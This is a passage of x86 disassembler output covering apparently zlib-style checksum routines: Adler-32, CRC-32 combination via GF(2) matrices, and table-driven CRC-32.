  408149:	c1 eb 10             	shr    $0x10,%ebx
  40814c:	69 d2 f1 ff 00 00    	imul   $0xfff1,%edx,%edx
  408152:	89 04 24             	mov    %eax,(%esp)
  408155:	01 df                	add    %ebx,%edi
  408157:	29 d1                	sub    %edx,%ecx
  408159:	89 ca                	mov    %ecx,%edx
  40815b:	0f af cd             	imul   %ebp,%ecx
  40815e:	29 d7                	sub    %edx,%edi
  408160:	89 c8                	mov    %ecx,%eax
  408162:	f7 e6                	mul    %esi
  408164:	b8 f0 ff 00 00       	mov    $0xfff0,%eax
  408169:	c1 ea 0f             	shr    $0xf,%edx
  40816c:	69 d2 f1 ff 00 00    	imul   $0xfff1,%edx,%edx
  408172:	29 d1                	sub    %edx,%ecx
  408174:	01 f9                	add    %edi,%ecx
  408176:	03 2c 24             	add    (%esp),%ebp
  408179:	8d 91 f1 ff 00 00    	lea    0xfff1(%ecx),%edx
  40817f:	74 10                	je     0x408191
  408181:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408184:	3d f0 ff 00 00       	cmp    $0xfff0,%eax
  408189:	76 06                	jbe    0x408191
  40818b:	8d 85 0e 00 ff ff    	lea    -0xfff2(%ebp),%eax
  408191:	81 e9 f1 ff 00 00    	sub    $0xfff1,%ecx
  408197:	81 fa e2 ff 01 00    	cmp    $0x1ffe2,%edx
  40819d:	0f 43 d1             	cmovae %ecx,%edx
  4081a0:	8d 8a 0f 00 ff ff    	lea    -0xfff1(%edx),%ecx
  4081a6:	81 fa f1 ff 00 00    	cmp    $0xfff1,%edx
  4081ac:	0f 43 d1             	cmovae %ecx,%edx
  4081af:	83 c4 04             	add    $0x4,%esp
  4081b2:	c1 e2 10             	shl    $0x10,%edx
  4081b5:	5b                   	pop    %ebx
  4081b6:	09 d0                	or     %edx,%eax
  4081b8:	5e                   	pop    %esi
  4081b9:	5f                   	pop    %edi
  4081ba:	5d                   	pop    %ebp
  4081bb:	c3                   	ret
  4081bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4081c0:	55                   	push   %ebp
  4081c1:	57                   	push   %edi
  4081c2:	56                   	push   %esi
  4081c3:	53                   	push   %ebx
  4081c4:	83 ec 38             	sub    $0x38,%esp
  4081c7:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  4081cb:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  4081cf:	89 c6                	mov    %eax,%esi
  4081d1:	0f b7 d8             	movzwl %ax,%ebx
  4081d4:	c1 ee 10             	shr    $0x10,%esi
  4081d7:	83 7c 24 54 01       	cmpl   $0x1,0x54(%esp)
  4081dc:	89 74 24 2c          	mov    %esi,0x2c(%esp)
  4081e0:	0f 84 47 03 00 00    	je     0x40852d
  4081e6:	85 c9                	test   %ecx,%ecx
  4081e8:	0f 84 72 03 00 00    	je     0x408560
  4081ee:	83 7c 24 54 0f       	cmpl   $0xf,0x54(%esp)
  4081f3:	77 5d                	ja     0x408252
  4081f5:	8b 54 24 54          	mov    0x54(%esp),%edx
  4081f9:	85 d2                	test   %edx,%edx
  4081fb:	74 1d                	je     0x40821a
  4081fd:	8b 54 24 54          	mov    0x54(%esp),%edx
  408201:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  408205:	01 ca                	add    %ecx,%edx
  408207:	83 c1 01             	add    $0x1,%ecx
  40820a:	0f b6 71 ff          	movzbl -0x1(%ecx),%esi
  40820e:	01 f3                	add    %esi,%ebx
  408210:	01 d8                	add    %ebx,%eax
  408212:	39 d1                	cmp    %edx,%ecx
  408214:	75 f1                	jne    0x408207
  408216:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40821a:	8d 83 0f 00 ff ff    	lea    -0xfff1(%ebx),%eax
  408220:	81 fb f1 ff 00 00    	cmp    $0xfff1,%ebx
  408226:	ba 71 80 07 80       	mov    $0x80078071,%edx
  40822b:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  40822f:	0f 43 d8             	cmovae %eax,%ebx
  408232:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  408236:	f7 e2                	mul    %edx
  408238:	c1 ea 0f             	shr    $0xf,%edx
  40823b:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  408241:	29 c7                	sub    %eax,%edi
  408243:	89 f8                	mov    %edi,%eax
  408245:	c1 e0 10             	shl    $0x10,%eax
  408248:	09 d8                	or     %ebx,%eax
  40824a:	83 c4 38             	add    $0x38,%esp
  40824d:	5b                   	pop    %ebx
  40824e:	5e                   	pop    %esi
  40824f:	5f                   	pop    %edi
  408250:	5d                   	pop    %ebp
  408251:	c3                   	ret
  408252:	81 7c 24 54 af 15 00 	cmpl   $0x15af,0x54(%esp)
  408259:	00 
  40825a:	89 dd                	mov    %ebx,%ebp
  40825c:	89 c8                	mov    %ecx,%eax
  40825e:	0f 86 06 03 00 00    	jbe    0x40856a
  408264:	81 6c 24 54 b0 15 00 	subl   $0x15b0,0x54(%esp)
  40826b:	00 
  40826c:	8d b0 b0 15 00 00    	lea    0x15b0(%eax),%esi
  408272:	89 74 24 30          	mov    %esi,0x30(%esp)
  408276:	8d 76 00             	lea    0x0(%esi),%esi
  408279:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408280:	0f b6 10             	movzbl (%eax),%edx
  408283:	83 c0 10             	add    $0x10,%eax
  408286:	8d 7c 15 00          	lea    0x0(%ebp,%edx,1),%edi
  40828a:	0f b6 50 f1          	movzbl -0xf(%eax),%edx
  40828e:	89 3c 24             	mov    %edi,(%esp)
  408291:	01 fa                	add    %edi,%edx
  408293:	89 d7                	mov    %edx,%edi
  408295:	0f b6 50 f2          	movzbl -0xe(%eax),%edx
  408299:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40829d:	89 d6                	mov    %edx,%esi
  40829f:	0f b6 50 f3          	movzbl -0xd(%eax),%edx
  4082a3:	01 fe                	add    %edi,%esi
  4082a5:	89 74 24 08          	mov    %esi,0x8(%esp)
  4082a9:	89 d3                	mov    %edx,%ebx
  4082ab:	0f b6 50 f4          	movzbl -0xc(%eax),%edx
  4082af:	01 f3                	add    %esi,%ebx
  4082b1:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  4082b5:	89 d1                	mov    %edx,%ecx
  4082b7:	0f b6 50 f5          	movzbl -0xb(%eax),%edx
  4082bb:	01 d9                	add    %ebx,%ecx
  4082bd:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4082c1:	89 d5                	mov    %edx,%ebp
  4082c3:	0f b6 50 f6          	movzbl -0xa(%eax),%edx
  4082c7:	01 cd                	add    %ecx,%ebp
  4082c9:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4082cd:	01 ea                	add    %ebp,%edx
  4082cf:	0f b6 68 ff          	movzbl -0x1(%eax),%ebp
  4082d3:	89 d7                	mov    %edx,%edi
  4082d5:	0f b6 50 f7          	movzbl -0x9(%eax),%edx
  4082d9:	89 7c 24 18          	mov    %edi,0x18(%esp)
  4082dd:	01 fa                	add    %edi,%edx
  4082df:	0f b6 78 fb          	movzbl -0x5(%eax),%edi
  4082e3:	89 d6                	mov    %edx,%esi
  4082e5:	0f b6 50 f8          	movzbl -0x8(%eax),%edx
  4082e9:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  4082ed:	01 f2                	add    %esi,%edx
  4082ef:	0f b6 70 fc          	movzbl -0x4(%eax),%esi
  4082f3:	89 d3                	mov    %edx,%ebx
  4082f5:	0f b6 50 f9          	movzbl -0x7(%eax),%edx
  4082f9:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4082fd:	01 da                	add    %ebx,%edx
  4082ff:	0f b6 58 fd          	movzbl -0x3(%eax),%ebx
  408303:	89 d1                	mov    %edx,%ecx
  408305:	0f b6 50 fa          	movzbl -0x6(%eax),%edx
  408309:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  40830d:	01 ca                	add    %ecx,%edx
  40830f:	0f b6 48 fe          	movzbl -0x2(%eax),%ecx
  408313:	01 d7                	add    %edx,%edi
  408315:	89 54 24 28          	mov    %edx,0x28(%esp)
  408319:	8b 54 24 04          	mov    0x4(%esp),%edx
  40831d:	03 14 24             	add    (%esp),%edx
  408320:	01 fe                	add    %edi,%esi
  408322:	03 54 24 08          	add    0x8(%esp),%edx
  408326:	01 f3                	add    %esi,%ebx
  408328:	03 54 24 0c          	add    0xc(%esp),%edx
  40832c:	01 d9                	add    %ebx,%ecx
  40832e:	03 54 24 10          	add    0x10(%esp),%edx
  408332:	01 cd                	add    %ecx,%ebp
  408334:	03 54 24 14          	add    0x14(%esp),%edx
  408338:	03 54 24 18          	add    0x18(%esp),%edx
  40833c:	03 54 24 1c          	add    0x1c(%esp),%edx
  408340:	03 54 24 20          	add    0x20(%esp),%edx
  408344:	03 54 24 24          	add    0x24(%esp),%edx
  408348:	03 54 24 28          	add    0x28(%esp),%edx
  40834c:	01 fa                	add    %edi,%edx
  40834e:	01 f2                	add    %esi,%edx
  408350:	01 d3                	add    %edx,%ebx
  408352:	01 d9                	add    %ebx,%ecx
  408354:	01 e9                	add    %ebp,%ecx
  408356:	01 4c 24 2c          	add    %ecx,0x2c(%esp)
  40835a:	3b 44 24 30          	cmp    0x30(%esp),%eax
  40835e:	0f 85 1c ff ff ff    	jne    0x408280
  408364:	b8 71 80 07 80       	mov    $0x80078071,%eax
  408369:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  40836d:	f7 e5                	mul    %ebp
  40836f:	c1 ea 0f             	shr    $0xf,%edx
  408372:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  408378:	29 c5                	sub    %eax,%ebp
  40837a:	b8 71 80 07 80       	mov    $0x80078071,%eax
  40837f:	f7 e7                	mul    %edi
  408381:	c1 ea 0f             	shr    $0xf,%edx
  408384:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  40838a:	29 c7                	sub    %eax,%edi
  40838c:	81 7c 24 54 af 15 00 	cmpl   $0x15af,0x54(%esp)
  408393:	00 
  408394:	8b 44 24 30          	mov    0x30(%esp),%eax
  408398:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  40839c:	0f 87 c2 fe ff ff    	ja     0x408264
  4083a2:	8b 44 24 54          	mov    0x54(%esp),%eax
  4083a6:	89 eb                	mov    %ebp,%ebx
  4083a8:	85 c0                	test   %eax,%eax
  4083aa:	0f 84 6c 01 00 00    	je     0x40851c
  4083b0:	83 7c 24 54 0f       	cmpl   $0xf,0x54(%esp)
  4083b5:	0f 86 b8 01 00 00    	jbe    0x408573
  4083bb:	8b 44 24 54          	mov    0x54(%esp),%eax
  4083bf:	8b 54 24 30          	mov    0x30(%esp),%edx
  4083c3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4083c7:	0f b6 02             	movzbl (%edx),%eax
  4083ca:	83 6c 24 04 10       	subl   $0x10,0x4(%esp)
  4083cf:	83 c2 10             	add    $0x10,%edx
  4083d2:	8d 34 03             	lea    (%ebx,%eax,1),%esi
  4083d5:	0f b6 42 f1          	movzbl -0xf(%edx),%eax
  4083d9:	89 74 24 08          	mov    %esi,0x8(%esp)
  4083dd:	01 f0                	add    %esi,%eax
  4083df:	89 c6                	mov    %eax,%esi
  4083e1:	0f b6 42 f2          	movzbl -0xe(%edx),%eax
  4083e5:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4083e9:	89 c7                	mov    %eax,%edi
  4083eb:	0f b6 42 f3          	movzbl -0xd(%edx),%eax
  4083ef:	01 f7                	add    %esi,%edi
  4083f1:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4083f5:	89 c1                	mov    %eax,%ecx
  4083f7:	0f b6 42 f4          	movzbl -0xc(%edx),%eax
  4083fb:	01 f9                	add    %edi,%ecx
  4083fd:	0f b6 7a f9          	movzbl -0x7(%edx),%edi
  408401:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  408405:	89 c3                	mov    %eax,%ebx
  408407:	0f b6 42 f5          	movzbl -0xb(%edx),%eax
  40840b:	01 cb                	add    %ecx,%ebx
  40840d:	0f b6 4a fb          	movzbl -0x5(%edx),%ecx
  408411:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  408415:	89 c5                	mov    %eax,%ebp
  408417:	0f b6 42 f6          	movzbl -0xa(%edx),%eax
  40841b:	01 dd                	add    %ebx,%ebp
  40841d:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  408421:	89 c6                	mov    %eax,%esi
  408423:	0f b6 42 f7          	movzbl -0x9(%edx),%eax
  408427:	01 ee                	add    %ebp,%esi
  408429:	0f b6 6a f8          	movzbl -0x8(%edx),%ebp
  40842d:	89 74 24 20          	mov    %esi,0x20(%esp)
  408431:	01 f0                	add    %esi,%eax
  408433:	0f b6 72 fa          	movzbl -0x6(%edx),%esi
  408437:	01 c5                	add    %eax,%ebp
  408439:	89 44 24 24          	mov    %eax,0x24(%esp)
  40843d:	0f b6 42 fc          	movzbl -0x4(%edx),%eax
  408441:	01 ef                	add    %ebp,%edi
  408443:	01 fe                	add    %edi,%esi
  408445:	01 f1                	add    %esi,%ecx
  408447:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  40844a:	0f b6 42 fd          	movzbl -0x3(%edx),%eax
  40844e:	89 1c 24             	mov    %ebx,(%esp)
  408451:	8b 1c 24             	mov    (%esp),%ebx
  408454:	01 c3                	add    %eax,%ebx
  408456:	0f b6 42 fe          	movzbl -0x2(%edx),%eax
  40845a:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  40845e:	01 d8                	add    %ebx,%eax
  408460:	0f b6 5a ff          	movzbl -0x1(%edx),%ebx
  408464:	89 44 24 34          	mov    %eax,0x34(%esp)
  408468:	01 c3                	add    %eax,%ebx
  40846a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40846e:	03 44 24 08          	add    0x8(%esp),%eax
  408472:	03 44 24 10          	add    0x10(%esp),%eax
  408476:	03 44 24 14          	add    0x14(%esp),%eax
  40847a:	03 44 24 18          	add    0x18(%esp),%eax
  40847e:	03 44 24 1c          	add    0x1c(%esp),%eax
  408482:	03 44 24 20          	add    0x20(%esp),%eax
  408486:	03 44 24 24          	add    0x24(%esp),%eax
  40848a:	01 e8                	add    %ebp,%eax
  40848c:	01 f8                	add    %edi,%eax
  40848e:	01 f0                	add    %esi,%eax
  408490:	01 c8                	add    %ecx,%eax
  408492:	03 04 24             	add    (%esp),%eax
  408495:	03 44 24 28          	add    0x28(%esp),%eax
  408499:	03 44 24 34          	add    0x34(%esp),%eax
  40849d:	01 d8                	add    %ebx,%eax
  40849f:	01 44 24 2c          	add    %eax,0x2c(%esp)
  4084a3:	83 7c 24 04 0f       	cmpl   $0xf,0x4(%esp)
  4084a8:	0f 87 19 ff ff ff    	ja     0x4083c7
  4084ae:	8b 44 24 54          	mov    0x54(%esp),%eax
  4084b2:	8b 74 24 30          	mov    0x30(%esp),%esi
  4084b6:	8b 54 24 54          	mov    0x54(%esp),%edx
  4084ba:	83 e8 10             	sub    $0x10,%eax
  4084bd:	83 e0 f0             	and    $0xfffffff0,%eax
  4084c0:	83 e2 0f             	and    $0xf,%edx
  4084c3:	8d 44 06 10          	lea    0x10(%esi,%eax,1),%eax
  4084c7:	85 d2                	test   %edx,%edx
  4084c9:	89 44 24 30          	mov    %eax,0x30(%esp)
  4084cd:	8d 42 ff             	lea    -0x1(%edx),%eax
  4084d0:	74 21                	je     0x4084f3
  4084d2:	8b 7c 24 30          	mov    0x30(%esp),%edi
  4084d6:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4084da:	8d 54 07 01          	lea    0x1(%edi,%eax,1),%edx
  4084de:	89 f8                	mov    %edi,%eax
  4084e0:	83 c0 01             	add    $0x1,%eax
  4084e3:	0f b6 70 ff          	movzbl -0x1(%eax),%esi
  4084e7:	01 f3                	add    %esi,%ebx
  4084e9:	01 d9                	add    %ebx,%ecx
  4084eb:	39 d0                	cmp    %edx,%eax
  4084ed:	75 f1                	jne    0x4084e0
  4084ef:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4084f3:	89 d8                	mov    %ebx,%eax
  4084f5:	b9 71 80 07 80       	mov    $0x80078071,%ecx
  4084fa:	f7 e1                	mul    %ecx
  4084fc:	89 d0                	mov    %edx,%eax
  4084fe:	c1 e8 0f             	shr    $0xf,%eax
  408501:	69 c0 f1 ff 00 00    	imul   $0xfff1,%eax,%eax
  408507:	29 c3                	sub    %eax,%ebx
  408509:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40850d:	f7 e1                	mul    %ecx
  40850f:	c1 ea 0f             	shr    $0xf,%edx
  408512:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  408518:	29 44 24 2c          	sub    %eax,0x2c(%esp)
  40851c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  408520:	83 c4 38             	add    $0x38,%esp
  408523:	c1 e0 10             	shl    $0x10,%eax
  408526:	09 d8                	or     %ebx,%eax
  408528:	5b                   	pop    %ebx
  408529:	5e                   	pop    %esi
  40852a:	5f                   	pop    %edi
  40852b:	5d                   	pop    %ebp
  40852c:	c3                   	ret
  40852d:	0f b6 01             	movzbl (%ecx),%eax
  408530:	01 d8                	add    %ebx,%eax
  408532:	8d 90 0f 00 ff ff    	lea    -0xfff1(%eax),%edx
  408538:	3d f1 ff 00 00       	cmp    $0xfff1,%eax
  40853d:	0f 43 c2             	cmovae %edx,%eax
  408540:	89 f2                	mov    %esi,%edx
  408542:	01 c2                	add    %eax,%edx
  408544:	8d 8a 0f 00 ff ff    	lea    -0xfff1(%edx),%ecx
  40854a:	81 fa f1 ff 00 00    	cmp    $0xfff1,%edx
  408550:	0f 43 d1             	cmovae %ecx,%edx
  408553:	83 c4 38             	add    $0x38,%esp
  408556:	c1 e2 10             	shl    $0x10,%edx
  408559:	5b                   	pop    %ebx
  40855a:	09 d0                	or     %edx,%eax
  40855c:	5e                   	pop    %esi
  40855d:	5f                   	pop    %edi
  40855e:	5d                   	pop    %ebp
  40855f:	c3                   	ret
  408560:	b8 01 00 00 00       	mov    $0x1,%eax
  408565:	e9 e0 fc ff ff       	jmp    0x40824a
  40856a:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  40856e:	e9 48 fe ff ff       	jmp    0x4083bb
  408573:	8b 44 24 54          	mov    0x54(%esp),%eax
  408577:	83 e8 01             	sub    $0x1,%eax
  40857a:	e9 53 ff ff ff       	jmp    0x4084d2
  40857f:	90                   	nop
  408580:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  408584:	8b 44 24 04          	mov    0x4(%esp),%eax
  408588:	8b 54 24 08          	mov    0x8(%esp),%edx
  40858c:	85 c9                	test   %ecx,%ecx
  40858e:	78 05                	js     0x408595
  408590:	e9 8b fb ff ff       	jmp    0x408120
  408595:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40859a:	c3                   	ret
  40859b:	90                   	nop
  40859c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4085a0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4085a4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4085a8:	8b 54 24 08          	mov    0x8(%esp),%edx
  4085ac:	85 c9                	test   %ecx,%ecx
  4085ae:	78 05                	js     0x4085b5
  4085b0:	e9 6b fb ff ff       	jmp    0x408120
  4085b5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4085ba:	c3                   	ret
  4085bb:	90                   	nop
  4085bc:	90                   	nop
  4085bd:	90                   	nop
  4085be:	90                   	nop
  4085bf:	90                   	nop
  4085c0:	57                   	push   %edi
  4085c1:	56                   	push   %esi
  4085c2:	31 ff                	xor    %edi,%edi
  4085c4:	53                   	push   %ebx
  4085c5:	8b 0c ba             	mov    (%edx,%edi,4),%ecx
  4085c8:	85 c9                	test   %ecx,%ecx
  4085ca:	74 21                	je     0x4085ed
  4085cc:	89 d3                	mov    %edx,%ebx
  4085ce:	31 f6                	xor    %esi,%esi
  4085d0:	f6 c1 01             	test   $0x1,%cl
  4085d3:	74 02                	je     0x4085d7
  4085d5:	33 33                	xor    (%ebx),%esi
  4085d7:	83 c3 04             	add    $0x4,%ebx
  4085da:	d1 e9                	shr    $1,%ecx
  4085dc:	75 f2                	jne    0x4085d0
  4085de:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  4085e1:	83 c7 01             	add    $0x1,%edi
  4085e4:	83 ff 20             	cmp    $0x20,%edi
  4085e7:	75 dc                	jne    0x4085c5
  4085e9:	5b                   	pop    %ebx
  4085ea:	5e                   	pop    %esi
  4085eb:	5f                   	pop    %edi
  4085ec:	c3                   	ret
  4085ed:	31 f6                	xor    %esi,%esi
  4085ef:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  4085f2:	83 c7 01             	add    $0x1,%edi
  4085f5:	83 ff 20             	cmp    $0x20,%edi
  4085f8:	75 cb                	jne    0x4085c5
  4085fa:	eb ed                	jmp    0x4085e9
  4085fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  408600:	55                   	push   %ebp
  408601:	57                   	push   %edi
  408602:	89 cd                	mov    %ecx,%ebp
  408604:	56                   	push   %esi
  408605:	53                   	push   %ebx
  408606:	89 c6                	mov    %eax,%esi
  408608:	81 ec 00 01 00 00    	sub    $0x100,%esp
  40860e:	85 c9                	test   %ecx,%ecx
  408610:	0f 8e d0 00 00 00    	jle    0x4086e6
  408616:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  40861d:	8d 8c 24 00 01 00 00 	lea    0x100(%esp),%ecx
  408624:	89 d7                	mov    %edx,%edi
  408626:	c7 84 24 80 00 00 00 	movl   $0xedb88320,0x80(%esp)
  40862d:	20 83 b8 ed 
  408631:	ba 01 00 00 00       	mov    $0x1,%edx
  408636:	8d 76 00             	lea    0x0(%esi),%esi
  408639:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408640:	89 10                	mov    %edx,(%eax)
  408642:	83 c0 04             	add    $0x4,%eax
  408645:	01 d2                	add    %edx,%edx
  408647:	39 c8                	cmp    %ecx,%eax
  408649:	75 f5                	jne    0x408640
  40864b:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  408652:	89 e0                	mov    %esp,%eax
  408654:	e8 67 ff ff ff       	call   0x4085c0
  408659:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  408660:	89 e2                	mov    %esp,%edx
  408662:	e8 59 ff ff ff       	call   0x4085c0
  408667:	89 f6                	mov    %esi,%esi
  408669:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408670:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  408677:	89 e0                	mov    %esp,%eax
  408679:	e8 42 ff ff ff       	call   0x4085c0
  40867e:	f7 c5 01 00 00 00    	test   $0x1,%ebp
  408684:	74 18                	je     0x40869e
  408686:	85 f6                	test   %esi,%esi
  408688:	74 14                	je     0x40869e
  40868a:	89 f3                	mov    %esi,%ebx
  40868c:	89 e0                	mov    %esp,%eax
  40868e:	31 f6                	xor    %esi,%esi
  408690:	f6 c3 01             	test   $0x1,%bl
  408693:	74 02                	je     0x408697
  408695:	33 30                	xor    (%eax),%esi
  408697:	83 c0 04             	add    $0x4,%eax
  40869a:	d1 eb                	shr    $1,%ebx
  40869c:	75 f2                	jne    0x408690
  40869e:	d1 fd                	sar    $1,%ebp
  4086a0:	74 40                	je     0x4086e2
  4086a2:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  4086a9:	89 e2                	mov    %esp,%edx
  4086ab:	e8 10 ff ff ff       	call   0x4085c0
  4086b0:	f7 c5 01 00 00 00    	test   $0x1,%ebp
  4086b6:	74 26                	je     0x4086de
  4086b8:	85 f6                	test   %esi,%esi
  4086ba:	74 22                	je     0x4086de
  4086bc:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  4086c3:	89 f3                	mov    %esi,%ebx
  4086c5:	31 f6                	xor    %esi,%esi
  4086c7:	89 f6                	mov    %esi,%esi
  4086c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4086d0:	f6 c3 01             	test   $0x1,%bl
  4086d3:	74 02                	je     0x4086d7
  4086d5:	33 30                	xor    (%eax),%esi
  4086d7:	83 c0 04             	add    $0x4,%eax
  4086da:	d1 eb                	shr    $1,%ebx
  4086dc:	75 f2                	jne    0x4086d0
  4086de:	d1 fd                	sar    $1,%ebp
  4086e0:	75 8e                	jne    0x408670
  4086e2:	89 f0                	mov    %esi,%eax
  4086e4:	31 f8                	xor    %edi,%eax
  4086e6:	81 c4 00 01 00 00    	add    $0x100,%esp
  4086ec:	5b                   	pop    %ebx
  4086ed:	5e                   	pop    %esi
  4086ee:	5f                   	pop    %edi
  4086ef:	5d                   	pop    %ebp
  4086f0:	c3                   	ret
  4086f1:	eb 0d                	jmp    0x408700
  4086f3:	90                   	nop
  4086f4:	90                   	nop
  4086f5:	90                   	nop
  4086f6:	90                   	nop
  4086f7:	90                   	nop
  4086f8:	90                   	nop
  4086f9:	90                   	nop
  4086fa:	90                   	nop
  4086fb:	90                   	nop
  4086fc:	90                   	nop
  4086fd:	90                   	nop
  4086fe:	90                   	nop
  4086ff:	90                   	nop
  408700:	b8 c0 e0 40 00       	mov    $0x40e0c0,%eax
  408705:	c3                   	ret
  408706:	8d 76 00             	lea    0x0(%esi),%esi
  408709:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408710:	55                   	push   %ebp
  408711:	57                   	push   %edi
  408712:	56                   	push   %esi
  408713:	53                   	push   %ebx
  408714:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  408718:	85 db                	test   %ebx,%ebx
  40871a:	0f 84 b2 02 00 00    	je     0x4089d2
  408720:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  408724:	8b 44 24 14          	mov    0x14(%esp),%eax
  408728:	85 c9                	test   %ecx,%ecx
  40872a:	f7 d0                	not    %eax
  40872c:	74 31                	je     0x40875f
  40872e:	f6 c3 03             	test   $0x3,%bl
  408731:	74 41                	je     0x408774
  408733:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  408737:	eb 0c                	jmp    0x408745
  408739:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  408740:	f6 c3 03             	test   $0x3,%bl
  408743:	74 2b                	je     0x408770
  408745:	83 c3 01             	add    $0x1,%ebx
  408748:	89 c2                	mov    %eax,%edx
  40874a:	c1 e8 08             	shr    $0x8,%eax
  40874d:	32 53 ff             	xor    -0x1(%ebx),%dl
  408750:	0f b6 d2             	movzbl %dl,%edx
  408753:	33 04 95 c0 e0 40 00 	xor    0x40e0c0(,%edx,4),%eax
  40875a:	83 e9 01             	sub    $0x1,%ecx
  40875d:	75 e1                	jne    0x408740
  40875f:	5b                   	pop    %ebx
  408760:	f7 d0                	not    %eax
  408762:	5e                   	pop    %esi
  408763:	5f                   	pop    %edi
  408764:	5d                   	pop    %ebp
  408765:	c3                   	ret
  408766:	8d 76 00             	lea    0x0(%esi),%esi
  408769:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408770:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  408774:	83 7c 24 1c 1f       	cmpl   $0x1f,0x1c(%esp)
  408779:	0f 86 ca 01 00 00    	jbe    0x408949
  40877f:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  408783:	89 d9                	mov    %ebx,%ecx
  408785:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  408789:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  408790:	33 01                	xor    (%ecx),%eax
  408792:	89 c5                	mov    %eax,%ebp
  408794:	0f b6 f8             	movzbl %al,%edi
  408797:	89 c2                	mov    %eax,%edx
  408799:	c1 ed 18             	shr    $0x18,%ebp
  40879c:	8b 3c bd c0 ec 40 00 	mov    0x40ecc0(,%edi,4),%edi
  4087a3:	c1 ea 10             	shr    $0x10,%edx
  4087a6:	33 3c ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edi
  4087ad:	0f b6 c4             	movzbl %ah,%eax
  4087b0:	0f b6 d2             	movzbl %dl,%edx
  4087b3:	33 79 04             	xor    0x4(%ecx),%edi
  4087b6:	33 3c 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edi
  4087bd:	8b 04 95 c0 e4 40 00 	mov    0x40e4c0(,%edx,4),%eax
  4087c4:	31 f8                	xor    %edi,%eax
  4087c6:	89 c2                	mov    %eax,%edx
  4087c8:	89 c5                	mov    %eax,%ebp
  4087ca:	c1 ea 10             	shr    $0x10,%edx
  4087cd:	c1 ed 18             	shr    $0x18,%ebp
  4087d0:	0f b6 fa             	movzbl %dl,%edi
  4087d3:	0f b6 d0             	movzbl %al,%edx
  4087d6:	0f b6 c4             	movzbl %ah,%eax
  4087d9:	8b 14 95 c0 ec 40 00 	mov    0x40ecc0(,%edx,4),%edx
  4087e0:	33 14 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edx
  4087e7:	33 51 08             	xor    0x8(%ecx),%edx
  4087ea:	33 14 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edx
  4087f1:	33 14 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%edx
  4087f8:	89 d0                	mov    %edx,%eax
  4087fa:	89 d5                	mov    %edx,%ebp
  4087fc:	c1 e8 10             	shr    $0x10,%eax
  4087ff:	c1 ed 18             	shr    $0x18,%ebp
  408802:	0f b6 f8             	movzbl %al,%edi
  408805:	0f b6 c2             	movzbl %dl,%eax
  408808:	0f b6 d6             	movzbl %dh,%edx
  40880b:	8b 04 85 c0 ec 40 00 	mov    0x40ecc0(,%eax,4),%eax
